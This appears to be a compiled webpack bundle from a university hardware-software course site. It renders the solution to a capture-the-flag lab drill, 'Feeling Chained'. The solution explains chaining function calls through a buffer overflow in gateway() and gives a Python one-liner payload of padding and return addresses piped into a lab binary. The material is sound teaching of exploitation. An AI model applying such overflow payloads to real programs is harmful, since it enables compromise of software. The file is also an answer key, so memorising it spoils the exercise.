"use strict";(self.webpackChunkhardware_software_interface=self.webpackChunkhardware_software_interface||[]).push([[2565],{5680:(e,t,r)=>{r.d(t,{xA:()=>u,yg:()=>g});var n=r(6540);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function o(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function i(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?o(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},o=Object.keys(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var s=n.createContext({}),c=function(e){var t=n.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):i(i({},t),e)),r},u=function(e){var t=c(e.components);return n.createElement(s.Provider,{value:t},e.children)},p="mdxType",f={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),p=c(r),d=a,g=p["".concat(s,".").concat(d)]||p[d]||f[d]||o;return r?n.createElement(g,i(i({ref:t},u),{},{components:r})):n.createElement(g,i({ref:t},u))}));function g(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=r.length,i=new Array(o);i[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[p]="string"==typeof e?e:a,i[1]=l;for(var c=2;c<o;c++)i[c]=r[c];return n.createElement.apply(null,i)}return n.createElement.apply(null,r)}d.displayName="MDXCreateElement"},7678:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>f,frontMatter:()=>o,metadata:()=>l,toc:()=>c});var n=r(8168),a=(r(6540),r(5680));const o={},i="Solution",l={unversionedId:"Lab 12 - Capture The Flag/CTF/Drills/Tasks/Feeling Chained/solution/README",id:"Lab 12 - Capture The Flag/CTF/Drills/Tasks/Feeling Chained/solution/README",title:"Solution",description:"By using the buffer overflow in gateway(), functions f1(56, 13) and f3(13) need to be called in this order, with those exact parameters.",source:"@site/docs/Lab 12 - Capture The Flag/CTF/Drills/Tasks/Feeling Chained/solution/README.md",sourceDirName:"Lab 12 - Capture The Flag/CTF/Drills/Tasks/Feeling Chained/solution",slug:"/Lab 12 - Capture The Flag/CTF/Drills/Tasks/Feeling Chained/solution/",permalink:"/hardware-software-interface/25/Lab 12 - Capture The Flag/CTF/Drills/Tasks/Feeling Chained/solution/",draft:!1,tags:[],version:"current",frontMatter:{}},s={},c=[],u={toc:c},p="wrapper";function f(e){let{components:t,...r}=e;return(0,a.yg)(p,(0,n.A)({},u,r,{components:t,mdxType:"MDXLayout"}),(0,a.yg)("h1",{id:"solution"},"Solution"),(0,a.yg)("p",null,"By using the buffer overflow in ",(0,a.yg)("inlineCode",{parentName:"p"},"gateway()"),", functions ",(0,a.yg)("inlineCode",{parentName:"p"},"f1(56, 13)")," and ",(0,a.yg)("inlineCode",{parentName:"p"},"f3(13)")," need to be called in this order, with those exact parameters.\n",(0,a.yg)("inlineCode",{parentName:"p"},"f3")," is the one that actually calls ",(0,a.yg)("inlineCode",{parentName:"p"},"get_flag()"),".\nCalling ",(0,a.yg)("inlineCode",{parentName:"p"},"get_flag()")," directly shouldn't work (a global variable is checked to make sure all steps were made)."),(0,a.yg)("pre",null,(0,a.yg)("code",{parentName:"pre",className:"language-sh"},'python3 -c \'import sys; sys.stdout.buffer.write(b"A"*22 + b"\\xbb\\x93\\x04\\x08" + b"\\x5d\\x93\\x04\\x08" + b"\\x38\\x00\\x00\\x00" + b"\\x0d\\x00\\x00\\x00")\' | ./buff-ovf3\n')))}f.isMDXComponent=!0}}]);